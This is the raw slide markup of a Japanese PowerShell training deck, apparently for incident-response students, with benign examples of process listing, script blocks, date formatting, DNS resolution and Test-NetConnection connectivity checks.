                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get-Process -Id $_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>parentProcessId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.Name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r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r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> |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40F1D332-E25B-F5DE-6970-F4E2DAD89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919" y="3766097"/>
            <a:ext cx="4859340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変数を定義せずに済む。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FF7B0EC-104E-8F7B-EE6D-4DCB23633C79}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6466642" y="4109010"/>
            <a:ext cx="4850646" cy="10156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$n = Get-Date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 $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>n.ToUniversalTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ToString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()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2022/11/16 22:11:59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4CC4718-93D2-E41E-47E3-9536E3309412}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6465612" y="5185645"/>
            <a:ext cx="4850646" cy="10156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(Get-Date).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ToUniversalTime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>().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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ToString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("o")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2022-11-16T22:08:03.1514363Z</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{312303B9-EE63-1760-1FCE-7AF424ED6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501" y="2564904"/>
            <a:ext cx="4859340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必要時まで評価を保留する。</a:t>
            </a:r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64814F-688A-1E69-CA7F-57C2D34F1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919" y="2586390"/>
            <a:ext cx="4859340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すぐ評価しオブジェクトを返す。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95F13B6-28FC-F1E8-62D6-83A4EBA0495D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884006" y="2924944"/>
            <a:ext cx="4825957" cy="7078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{Get-Process </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lsass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}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Get-Process </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lsass</a:t>
            </a:r>
            <a:endParaRPr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95E80F3-DDE2-9D0F-801A-8EE8C24109E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6465612" y="2920368"/>
            <a:ext cx="4850646" cy="7078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(Get-Process).Count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336</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4013838-9C8D-1848-C9EE-194994571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049" y="5754742"/>
            <a:ext cx="4859340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無名関数の一種。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F191E7A-33AF-766C-D00A-EC2D314B7BDB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884006" y="3686252"/>
            <a:ext cx="4825957" cy="1938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$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>pslsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = {Get-Process </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lsass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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&gt; Invoke-Command $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>pslsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fl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Id      : 1488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Handles : 1974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CPU     : 94.1875</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27CF6EFA-FB1A-F227-B80F-26743A870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500" y="894202"/>
            <a:ext cx="9530979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文を式にするのは共通だが、評価のタイミングが異なる。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12947427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9A4D0C04-43D2-4379-E524-7D3A39717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ネットワーク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A7DA24C-7222-D5B9-0A16-90A4096263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A6F6E0D-7A1F-C805-7505-157621AD73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18</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{780D2FC3-F8D6-4D16-A09D-3F4FF349F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7868" y="4941168"/>
            <a:ext cx="6407830" cy="126014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numCol="3" spcCol="288000">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/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基本事項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プロセス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b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ネットワーク</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" b="1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ファイル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永続化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イベントログ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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環境整備</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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学習案内</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP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まとめ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:latin typeface="+mn-ea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76102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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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ネットワーク </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| DNS</a:t>
            </a:r>
            <a:endParaRPr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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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19</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0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72E8DB73-B401-E44E-E8DA-E9E0008BE3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679199"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8112224" y="840995"/>
          <a:ext cx="3205064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5064">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Cmdlet - </a:t>
                      </a:r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DnsClient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14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Resolve-</a:t>
                      </a:r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DnsName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370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Get-</a:t>
                      </a:r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DnsClientCache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056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Clear-</a:t>
                      </a:r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DnsClientCache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033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Get-</a:t>
                      </a:r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DnsClientServerAddress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447962"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD845439-795B-FF51-3E1C-80A7264C1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3738518"/>
            <a:ext cx="10440989" cy="677108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Resolve-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>DnsName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は名前解決に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LLMNR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や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NetBIOS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も利用する。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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>下は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LLMNR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が使われた例。</a:t>
            </a:r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E68CB4D9-11B3-2F26-68EE-43BA4B669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20" y="935432"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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Resolve-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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DnsName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67ABE14-BDF2-2741-CA2E-BE38FA73C419}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884518" y="1355864"/>
            <a:ext cx="7093495" cy="1785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Resolve-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DnsName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Name jcom.co.jp -Type MX </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>`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-Server 8.8.8.8 | Format-Table -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>AutoSize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Name       Type TTL  Section </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NameExchange</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   Pre...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----       ---- ---  ------- ------------   -----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jcom.co.jp MX   3459 Answer  mx.securemx.jp 10</a:t>
            </a:r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3BA90ED4-4DDF-5532-149B-BE5DF704F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3270466"/>
            <a:ext cx="10728314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PowerShell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では「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`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」がエスケープ文字。好きな場所で改行する際にも使う。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7120E44-F662-161E-D037-B81F9854D610}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884518" y="4416204"/>
            <a:ext cx="9099914" cy="1785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Resolve-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DnsName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Name sec504student | ft -a</a:t>
            </a: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Name                Type TTL Section </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IPAddress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----                ---- --- ------- ---------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Sec504Student.local AAAA 60  Answer  fe80::5d5e:5f32:f4f8:e445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Sec504Student.local A    60  Answer  10.10.0.1</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14926542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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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ネットワーク </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| L4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>疎通確認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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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20</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D71EDE3A-FA5D-751E-72D1-526A532D1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147255"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8544980" y="935432"/>
          <a:ext cx="2772308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308">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Cmdlet - </a:t>
                      </a:r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NetTCPIP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14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i="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Test-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="0" dirty="0" err="1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NetConnection</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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5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Get-</a:t>
                      </a:r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NetTCPConnection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370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Get-</a:t>
                      </a:r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NetUDPEndpoint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056167"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAA53661-90B3-D008-C0A5-4C0BD3926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20" y="935432"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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Test-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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NetConnection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092AF9A8-14B3-7759-782C-52A553D85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1304764"/>
            <a:ext cx="10440989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既定では進捗通知の緑帯が表示されるが、消せる。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650E2B5-5360-9906-608F-BC2740C5161C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886455" y="1682802"/>
            <a:ext cx="7513801" cy="2708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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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ProgressPreference</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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SilentlyContinue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 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 Test-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetConnection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> www.jcom.co.jp</a:t>
            </a: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ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>           : www.jcom.co.jp</a:t>
            </a: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RemoteAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          : 2606:4700::6810:aeec</a:t>
            </a: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InterfaceAlias</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>         : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>イーサネット </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</a:t>
            </a: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SourceAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          : 240d:1a:3cd:1f00:99 ...</a:t>
            </a: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PingSucceeded</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          : True</a:t>
            </a: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PingReplyDetails</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (RTT) : 4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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0064EDBF-8851-B610-C0F2-49F8250F5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4552145"/>
            <a:ext cx="4751650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TCP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ポート開閉状況を確認する。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C22F73C-F017-3739-230C-018FE3D00D9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6466642" y="4905164"/>
            <a:ext cx="4850646" cy="1477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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tnc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 1.1.1.1 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TraceRoute</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br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1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>TraceRoute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  : 192.168.1.1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              147.192.32.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>                            . . .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2CB6BF9-5A5E-E0C6-C4AA-CEE361CD45D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886455" y="4905164"/>
            <a:ext cx="4850646" cy="10156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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
